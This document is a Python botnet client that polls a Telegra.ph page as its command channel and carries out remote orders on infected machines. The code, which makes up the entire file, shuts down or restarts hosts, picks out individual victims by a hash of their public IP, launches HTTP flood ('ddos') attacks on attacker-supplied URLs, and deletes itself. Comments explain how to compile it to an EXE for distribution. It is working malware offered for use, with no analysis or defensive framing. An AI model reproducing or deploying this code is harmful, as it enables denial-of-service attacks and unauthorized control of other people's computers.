from bs4 import BeautifulSoup
from threading import *
import requests
import stun
import sys
import hashlib
import os

def dos(url):
	try:
		requests.get(url)
		requests.post(url)
	except requests.exceptions.ConnectionError:
		pass

def getNeedIP(mainQuery):
	return hashlib.sha1(bytes(mainQuery.replace(f'{mainQuery} ', ''), encoding='utf-8')).hexdigest()

def getTargetIP():
	return hashlib.sha1(bytes(str(stun.get_ip_info()[1]), encoding='utf-8')).hexdigest()

url = "" # Insert the link to Telegra.ph the village where you enter the command
def mainTry():
	while True:
		try:
			response = requests.get(url);
			soup = BeautifulSoup(response.text, 'lxml')
			command = soup.find_all('p')
			textIW = command[0].text
			if ("restartAll" in textIW):
                #If you compiled this code in EXE, remove the line below, and insert: os.system("start your_main_file(exe)_name.exe")
				os.system("python main.py")
				sys.exit()
			if ("turnOffAll" in textIW):
				os.system("shutdown -s")
			if ("restartSYSAll" in textIW):
				os.system("shutdown /r /t 1")
			if ("turnOff" in textIW):
				if (getNeedIP(textIW) == getTargetIP()):
					os.system("shutdown -s")
			if ("restartSYS" in textIW):
				if (getNeedIP(textIW) == getTargetIP()):
					os.system("shutdown /r /t 1")
			if ("restartApp" in textIW):
				if (getNeedIP(textIW) == getTargetIP()):
					#If you compiled this code in EXE, remove the line below, and insert: os.system("start your_main_file(exe)_name.exe")
					os.system("python main.py")
					sys.exit()
			if ("ddos" in textIW):
				urlForAttack = textIW.replace("ddos ", "")
				Thread(target=dos(urlForAttack), args=()).start()
			if ("closeAll" in textIW):
				sys.exit()
			if ("closeApp" in textIW):
				if (getNeedIP(textIW) == getTargetIP()):
					sys.exit()
			if ("deleteAllBotes" in textIW):
				import delete
				sys.exit()
			if ("deleteBot" in textIW):
				if (getNeedIP(textIW) == getTargetIP()):
					#If you compiled the code for self -loving in EXE, remove the line below, and insert: os.system("start your_file(exe)_name_for_deleting_client_file.exe")
					import delete
					sys.exit()
		except requests.exceptions.ConnectionError:
			pass

Thread(target=mainTry, args=()).start()
